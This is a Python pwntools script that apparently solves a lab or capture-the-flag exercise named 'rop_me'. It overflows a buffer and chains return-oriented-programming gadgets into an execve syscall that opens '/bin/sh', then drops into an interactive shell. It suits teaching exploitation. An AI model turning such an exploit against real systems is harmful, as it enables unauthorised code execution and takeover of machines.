#!/usr/bin/env python3
from pwn import *


# auxiliary function to convert addresses for storing in the stack
def p(x):
    return struct.pack("<Q", x)


conn = process('./rop_me')
# conn = remote("rop.syssec.dk", 1337)

conn.recvuntil(b"- readable/writable 1024 B array at address  ")
buffer_address = int(
    conn.recvline(b"- readable/writable 1024 B array at address  "), 16
)
info(f"buffer @ 0x{buffer_address:x}")

conn.recvuntil(b"ROP me!\n")

rop_chain = b""

rop_chain += b"A" * 0x30  # fill the buffer
rop_chain += b"C" * 0x8   # overwrite saved based pointer (rbp)
rop_chain += p(0x40121b)  # pop rax; ret
rop_chain += p(0x3b)      # data - syscall number of execve
rop_chain += p(0x401453)  # pop rdi; ret
rop_chain += p(0x402012)  # data - "/bin/sh" pointer from rop_me
rop_chain += p(0x401451)  # pop rsi; pop r15; ret
rop_chain += p(0x404080)  # data - NULL pointer from rop_me
rop_chain += p(0x4013c1)  # xor edi, edi; mov rdx, rdi; inc rdi; ret
rop_chain += p(0x4013a2)  # syscall

conn.send(rop_chain)
conn.interactive()
